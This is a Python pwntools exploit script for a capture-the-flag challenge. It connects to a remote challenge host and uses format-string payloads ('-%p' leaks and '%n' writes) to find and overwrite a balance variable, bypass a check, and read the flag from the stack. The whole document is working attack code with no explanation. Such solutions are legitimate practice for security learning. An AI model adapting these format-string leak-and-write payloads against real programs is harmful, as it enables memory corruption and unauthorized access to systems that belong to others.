#!/usr/bin/env python3
from pwn import *

context.update(arch='x86')
exe = './chall'
elf = ELF("./chall")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# p = start()
p = remote("gc1.eng.run", 32309)

#Leaking the bal variable address
p.recv()

p.sendline(b"1")
p.recvuntil(b"like to check your leaks?")
p.sendline(b"-%p"*50)
p.recvline()
leak = p.recvline()
leak = leak.split(b"-")

baladd = int(leak[21], 16)+10974
log.info(f"bal address: {hex(baladd)}")

#Over write bal with 200 to bypass the check
p.sendline(b"1")
p.recv()
p.sendline(b"%99c%9$n%90c%9$n%11c%9$n" + p64(baladd))
p.recv()

#Leak the flag from the stack since its opened
p.sendline(b"3")
p.recvuntil(b"feedback!")
p.sendline(b"%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p")
p.recvline()

#Change the hex flag to ascii
flag = p.recvline().split(b"-")
final = ""

for hexval in flag:
    try:
        final += (str(bytes.fromhex(str(hexval)[4:-1]).decode('utf-8'))[::-1])
    except:
        continue

final += "ng!!}"
log.info(f"flag: {final}")

p.interactive()

